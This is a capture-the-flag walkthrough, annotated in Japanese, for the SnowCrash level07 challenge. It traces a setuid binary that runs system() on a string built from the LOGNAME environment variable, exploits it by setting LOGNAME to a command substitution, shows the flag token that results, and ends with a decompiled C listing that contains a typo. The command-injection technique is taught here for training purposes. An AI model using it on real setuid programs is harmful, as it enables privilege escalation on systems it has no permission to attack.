```sh
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

```sh
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                                                   = 2007
geteuid()                                                                                                                                   = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
getenv("LOGNAME")                                                                                                                           = "level07"
asprintf(0xbffff734, 0x8048688, 0xbfffff44, 0xb7e5ee55, 0xb7fed280)                                                                         = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                      = 0
+++ exited (status 0) +++
```

asprintfで作成した文字列をsystemで実行している

```sh
level07@SnowCrash:~$ export LOGNAME="\$(getflag)"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## 補足

```c
void main(void)
{
  char *pcVar1;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  system(local_1c);
  returun 0;
}
```
